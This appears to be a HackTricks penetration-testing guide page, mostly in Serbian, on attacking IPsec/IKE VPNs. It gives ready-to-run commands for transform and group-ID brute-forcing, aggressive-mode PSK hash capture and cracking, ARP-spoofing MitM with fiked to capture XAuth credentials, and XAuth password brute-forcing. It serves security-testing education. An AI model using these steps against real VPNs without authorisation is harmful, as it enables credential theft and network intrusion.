# 500/udp - Pentesting IPsec/IKE VPN

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Osnovne informacije

**IPsec** je 코iroko prepoznat kao glavna tehnologija za obezbe캠ivanje komunikacija izme캠u mre쬬 (LAN-to-LAN) i od udaljenih korisnika do mre쬹og prolaza (udaljeni pristup), slu쬰캖i kao osnovna infrastruktura za re코enja VPN za preduze캖a.

Usmeravanje **bezbednosne asocijacije (SA)** izme캠u dva mesta upravlja **IKE**, koji funkcioni코e pod okriljem ISAKMP, protokola dizajniranog za autentifikaciju i razmenu klju캜eva. Ovaj proces se odvija u nekoliko faza:

* **Faza 1:** Stvara se siguran kanal izme캠u dva krajnja ta캜ke. To se posti쬰 kori코캖enjem Pre-Shared Key (PSK) ili sertifikata, koriste캖i ili glavni re쬴m, koji uklju캜uje tri para poruka, ili **agresivni re쬴m**.
* **Faza 1.5:** Iako nije obavezna, ova faza, poznata kao Faza pro코irene autentifikacije, verifikuje identitet korisnika koji poku코ava da se pove쬰 zahtevaju캖i korisni캜ko ime i lozinku.
* **Faza 2:** Ova faza je posve캖ena pregovorima o parametrima za obezbe캠ivanje podataka sa **ESP** i **AH**. Omogu캖ava kori코캖enje algoritama razli캜itih od onih u Fazi 1 kako bi se osigurala **Perfect Forward Secrecy (PFS)**, pobolj코avaju캖i bezbednost.

**Podrazumevani port:** 500/udp

## **Otkrijte** uslugu koriste캖i nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **Pronala쬰nje validne transformacije**

IPSec konfiguracija mo쬰 biti pripremljena da prihvati samo jednu ili nekoliko transformacija. Transformacija je kombinacija vrednosti. **Svaka transformacija** sadr쬴 niz atributa kao 코to su DES ili 3DES kao **algoritam enkripcije**, SHA ili MD5 kao **algoritam integriteta**, unapred podeljeni klju캜 kao **tip autentifikacije**, Diffie-Hellman 1 ili 2 kao **algoritam distribucije klju캜eva** i 28800 sekundi kao **vreme trajanja**.

Dakle, prva stvar koju treba da uradite je da **prona캠ete validnu transformaciju**, kako bi server mogao da komunicira sa vama. Da biste to uradili, mo쬰te koristiti alat **ike-scan**. Po defaultu, Ike-scan radi u glavnom re쬴mu i 코alje paket ka gateway-u sa ISAKMP zaglavljem i jednim predlogom sa **osam transformacija unutar njega**.

U zavisnosti od odgovora, mo쬰te dobiti neke informacije o krajnjoj ta캜ki:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
As you can see in the previous response, there is a field called **AUTH** with the value **PSK**. This means that the vpn is configured using a preshared key (and this is really good for a pentester).\
**Vrednost poslednje linije je tako캠e veoma va쬹a:**

* _0 returned handshake; 0 returned notify:_ To zna캜i da cilj **nije IPsec gateway**.
* _**1 returned handshake; 0 returned notify:**_ To zna캜i da je **cilj konfigurisan za IPsec i spreman je da izvr코i IKE pregovaranje, i jedan ili vi코e transformacija koje ste predlo쬴li su prihvatljive** (va쬬 transformacija 캖e biti prikazana u izlazu).
* _0 returned handshake; 1 returned notify:_ VPN gateway-i odgovaraju sa obave코tenjem kada **nijedna od transformacija nije prihvatljiva** (iako neki gateway-i to ne rade, u tom slu캜aju treba poku코ati dalju analizu i revidirani predlog).

Then, in this case we already have a valid transformation but if you are in the 3rd case, then you need to **brute-force a little bit to find a valid transformation:**

Prvo 코to treba da uradite je da kreirate sve mogu캖e transformacije:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
I zatim izvr코ite brute-force za svaki koriste캖i ike-scan (ovo mo쬰 potrajati nekoliko minuta):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Ako brute-force nije uspeo, mo쬯a server odgovara bez rukovanja 캜ak i na va쬰캖e transformacije. Tada mo쬰te poku코ati isti brute-force, ali koriste캖i agresivni re쬴m:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Nadamo se da 캖e **va쬰캖a transformacija biti vra캖ena**.\
Mo쬰te poku코ati **istu napad** koriste캖i [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Tako캠e mo쬰te poku코ati da brute force-ujete transformacije sa [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (617).png>)

U **DH grupi: 14 = 2048-bit MODP** i **15 = 3072-bit**\
**2 = HMAC-SHA = SHA1 (u ovom slu캜aju). Format `--trans` je $Enc,$Hash,$Auth,$DH**

Cisco ukazuje da se izbegava kori코캖enje DH grupa 1 i 2 jer nisu dovoljno jake. Stru캜njaci veruju da **zemlje sa mnogo resursa lako mogu da provale enkripciju** podataka koji koriste ove slabe grupe. To se radi kori코캖enjem posebne metode koja ih priprema da brzo razbiju kodove. Iako postavljanje ove metode ko코ta mnogo novca, omogu캖ava ovim mo캖nim zemljama da 캜itaju enkriptovane podatke u realnom vremenu ako koriste grupu koja nije jaka (kao 코to je 1,024-bit ili manja).

### Fingerprinting servera

Zatim, mo쬰te koristiti ike-scan da poku코ate da **otkrijete dobavlja캜a** ure캠aja. Alat 코alje inicijalni predlog i prestaje da ponavlja. Zatim 캖e **analizirati** **razliku** u **vremenu** **izme캠u** primljenih **poruka** sa servera i odgovaraju캖eg obrasca odgovora, pentester mo쬰 uspe코no da identifikuje dobavlja캜a VPN prolaza. 맚avi코e, neki VPN serveri 캖e koristiti opcioni **Vendor ID (VID) payload** sa IKE.

**Specifikujte va쬰캖u transformaciju ako je potrebno** (koriste캖i --trans)

Ako IKE otkrije koji je dobavlja캜, od코tampa캖ete to:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Ovo se tako캠e mo쬰 posti캖i sa nmap skriptom _**ike-version**_

## Pronala쬰nje ispravnog ID-a (naziv grupe)

Da biste bili u mogu캖nosti da uhvatite hash, potrebna vam je va쬰캖a transformacija koja podr쬬va Agresivni re쬴m i ispravni ID (naziv grupe). Verovatno ne캖ete znati va쬰캖i naziv grupe, pa 캖ete morati da ga brute-forcujete.\
Da biste to uradili, preporu캜ujem vam 2 metode:

### Bruteforcing ID sa ike-scan

Prvo poku코ajte da po코aljete zahtev sa la쬹im ID-om poku코avaju캖i da prikupite hash ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Ako **nije vra캖en nijedan hash**, onda verovatno ova metoda brute-forcinga 캖e raditi. **Ako je neki hash vra캖en, to zna캜i da 캖e la쬹i hash biti poslat nazad za la쬹i ID, tako da ova metoda ne캖e biti pouzdana** za brute-force ID. Na primer, la쬹i hash bi mogao biti vra캖en (to se de코ava u modernim verzijama):

![](<../.gitbook/assets/image (917).png>)

Ali ako, kao 코to sam rekao, nijedan hash nije vra캖en, onda bi trebalo da poku코ate da brute-forcujete uobi캜ajena imena grupa koriste캖i ike-scan.

Ovaj skript **캖e poku코ati da brute-forcuje mogu캖e ID-e** i vrati캖e ID-e gde je vra캖en validan handshake (to 캖e biti validno ime grupe).

Ako ste otkrili specifi캜nu transformaciju, dodajte je u ike-scan komandu. A ako ste otkrili nekoliko transformacija, slobodno dodajte novu petlju da ih sve isprobate (trebalo bi da ih sve isprobate dok jedna od njih ne radi ispravno).

Mo쬰te koristiti [re캜nik ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ili [onaj u seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) sa uobi캜ajenim imenima grupa da ih brute-forcujete:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Or use this dict (is a combination of the other 2 dicts without repetitions):

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### Bruteforcing ID with Iker

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) tako캠e koristi **ike-scan** za bruteforcing mogu캖e nazive grupa. Prati svoju metodu da **prona캠e va쬰캖i ID na osnovu izlaza ike-scan**.

### Bruteforcing ID with ikeforce

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) je alat koji se mo쬰 koristiti za **bruteforce ID-eve tako캠e**. Ovaj alat 캖e **poku코ati da iskoristi razli캜ite ranjivosti** koje bi mogle biti kori코캖ene da **razlikuju va쬰캖i i neva쬰캖i ID** (mogu imati la쬹e pozitivne i la쬹e negativne rezultate, zato preferiram da koristim metodu ike-scan ako je mogu캖e).

Podrazumevano **ikeforce** 캖e na po캜etku poslati neke nasumi캜ne id-ove da proveri pona코anje servera i odredi taktiku koja 캖e se koristiti.

* **Prva metoda** je da se bruteforce nazivi grupa tako 코to se **tra쬴** informacija **Dead Peer Detection DPD** Cisco sistema (ove informacije server ponovo 코alje samo ako je naziv grupe ta캜an).
* **Druga metoda** koja je dostupna je da **proverava broj odgovora poslatih na svaki poku코aj** jer se ponekad 코alje vi코e paketa kada se koristi ta캜an id.
* **Tre캖a metoda** se sastoji u **tra쬰nju "INVALID-ID-INFORMATION" kao odgovor na neva쬰캖i ID**.
* Na kraju, ako server ne odgovara na provere, **ikeforce** 캖e poku코ati da bruteforce server i proveri da li kada se po코alje ta캜an id server odgovara nekim paketom.\
O캜igledno, cilj bruteforcinga id-a je da se dobije **PSK** kada imate va쬰캖i id. Zatim, sa **id** i **PSK** mora캖ete da bruteforce-ujete XAUTH (ako je omogu캖en).

Ako ste otkrili specifi캜nu transformaciju dodajte je u ikeforce komandu. A ako ste otkrili nekoliko transformacija slobodno dodajte novu petlju da ih sve isprobate (trebalo bi da ih isprobate sve dok jedna od njih ne funkcioni코e ispravno).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(From the book **Network Security Assessment: Know Your Network**): Tako캠e je mogu캖e dobiti va쬰캖e korisni캜ke nazive presretanjem veze izme캠u VPN klijenta i servera, jer se prvi paket agresivnog moda koji sadr쬴 ID klijenta 코alje u 캜istom obliku.

![](<../.gitbook/assets/image (891).png>)

## Capturing & cracking the hash

Na kraju, ako ste prona코li **va쬰캖u transformaciju** i **ime grupe** i ako je **agresivni mod dozvoljen**, onda mo쬰te vrlo lako uhvatiti hash koji se mo쬰 probiti:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
Hash 캖e biti sa캜uvan unutar _hash.txt_.

Mo쬰te koristiti **psk-crack**, **john** (koriste캖i [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) i **hashcat** da **crack**-ujete hash:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Agresivni na캜in IKE** u kombinaciji sa **Pre-Shared Key (PSK)** se 캜esto koristi za **grupnu autentifikaciju**. Ova metoda je poja캜ana sa **XAuth (Pro코irena autentifikacija)**, koja slu쬴 da uvede dodatni sloj **autentifikacije korisnika**. Takva autentifikacija obi캜no koristi usluge kao 코to su **Microsoft Active Directory**, **RADIUS**, ili sli캜ni sistemi.

Prelazak na **IKEv2** donosi zna캜ajnu promenu gde se **EAP (Pro코irivi protokol autentifikacije)** koristi umesto **XAuth** za autentifikaciju korisnika. Ova promena nagla코ava evoluciju u praksama autentifikacije unutar sigurnosnih komunikacionih protokola.

### Lokalna mre쬬 MitM za hvatanje kredencijala

Tako mo쬰te uhvatiti podatke o prijavljivanju koriste캖i _fiked_ i videti da li postoji neki podrazumevani korisni캜ki naziv (Morate preusmeriti IKE saobra캖aj na `fiked` za snimanje, 코to se mo쬰 uraditi uz pomo캖 ARP spoofinga, [vi코e informacija](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked 캖e delovati kao VPN krajnja ta캜ka i uhvati캖e XAuth kredencijale:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
Tako캠e, koriste캖i IPSec poku코ajte da izvr코ite MitM napad i blokirate sav saobra캖aj ka portu 500, ako IPSec tunel ne mo쬰 da se uspostavi mo쬯a 캖e saobra캖aj biti poslat u 캜istom obliku.

### Brute-forcing XAUTH korisni캜ko ime i lozinku sa ikeforce

Da biste brute-forcovali **XAUTH** (kada znate va쬰캖e ime grupe **id** i **psk**) mo쬰te koristiti korisni캜ko ime ili listu korisni캜kih imena i listu lozinki:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Na ovaj na캜in, ikeforce 캖e poku코ati da se pove쬰 koriste캖i svaku kombinaciju korisni캜kog imena:lozinke.

Ako ste prona코li jednu ili vi코e validnih transformacija, jednostavno ih koristite kao u prethodnim koracima.

## Autentifikacija sa IPSEC VPN-om

U Kali, **VPNC** se koristi za uspostavljanje IPsec tunela. **profili** moraju biti sme코teni u direktorijumu `/etc/vpnc/`. Mo쬰te pokrenuti ove profile koriste캖i komandu _**vpnc**_.

Slede캖e komande i konfiguracije ilustruju proces postavljanja VPN veze sa VPNC:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
U ovoj konfiguraciji:

* Zamenite `[VPN_GATEWAY_IP]` sa stvarnom IP adresom VPN prolaza.
* Zamenite `[VPN_CONNECTION_ID]` sa identifikatorom za VPN vezu.
* Zamenite `[VPN_GROUP_SECRET]` sa grupnom tajnom VPN-a.
* Zamenite `[VPN_USERNAME]` i `[VPN_PASSWORD]` sa autentifikacionim podacima za VPN.
* `[PID]` simbolizuje ID procesa koji 캖e biti dodeljen kada `vpnc` inicira.

Osigurajte da se koriste stvarne, sigurne vrednosti za zamenu mesta kada konfiguri코ete VPN.

## Referentni materijal

* [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Scanning a VPN Implementation](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3rd Edition

## Shodan

* `port:500 IKE`

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
